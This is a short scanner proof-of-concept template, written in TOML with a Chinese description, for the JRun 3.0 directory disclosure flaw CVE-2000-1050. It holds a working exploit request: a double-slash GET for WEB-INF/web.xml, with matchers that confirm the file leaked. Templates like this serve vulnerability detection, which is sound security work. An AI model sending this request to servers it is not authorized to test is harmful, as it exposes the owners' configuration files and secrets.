[info]
author = "ave"
description = "验证 Allaire JRun 3.0 http servlet server 是否允许远程攻击者通过在请求路径起始位置添加额外斜杠直接访问 WEB-INF 目录，导致敏感配置文件泄露"
id = "POC-AVE-2000-0762"
name = "Allaire JRun 3 Directory Disclosure PoC"
severity = "medium"
tags = ["ave-2000-0762"]
vuln_id = [
    "CVE-2000-1050",
    "AVE-2000-0762",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}//WEB-INF/web.xml"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    "<?xml",
    "<web-app",
]
